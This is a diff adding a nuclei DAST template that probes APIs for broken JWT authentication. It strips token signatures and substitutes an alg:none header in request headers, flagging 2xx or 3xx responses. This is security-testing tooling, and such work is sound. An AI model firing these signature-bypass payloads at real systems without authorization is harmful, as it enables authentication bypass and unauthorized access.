@@ -1,0 +1,34 @@
+id: api2-jwt-alg-none
+
+info:
+  name: API2 Broken Authentication - JWT alg:none / Signature Strip
+  author: dast-scanner
+  severity: critical
+  description: >
+    Unchanged in spirit from before, and already dictionary-free: it matches by
+    VALUE SHAPE (the three-dot-separated base64 pattern of a JWT), not by field
+    name, so it fires correctly regardless of whether the token sits in
+    Authorization, a cookie, or a custom header nuclei picked up from the spec.
+  classification: { cwe-id: CWE-347 }
+  tags: api,owasp-api2,authentication,jwt,dast
+
+variables:
+  jwt_none_header: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
+
+http:
+  - fuzzing:
+      - part: header
+        type: replace-regex
+        mode: single
+        values: ['(?i)(bearer\s+)?ey[A-Za-z0-9_-]+\.ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+']
+        replace-regex: '\.[A-Za-z0-9_-]+$'
+        fuzz: ['.', '.invalid-signature-probe']
+      - part: header
+        type: replace-regex
+        mode: single
+        values: ['(?i)(bearer\s+)?ey[A-Za-z0-9_-]+\.']
+        replace-regex: 'ey[A-Za-z0-9_-]+\.'
+        fuzz: ['{{jwt_none_header}}.']
+    matchers:
+      - type: dsl
+        dsl: ['status_code >= 200 && status_code < 400']
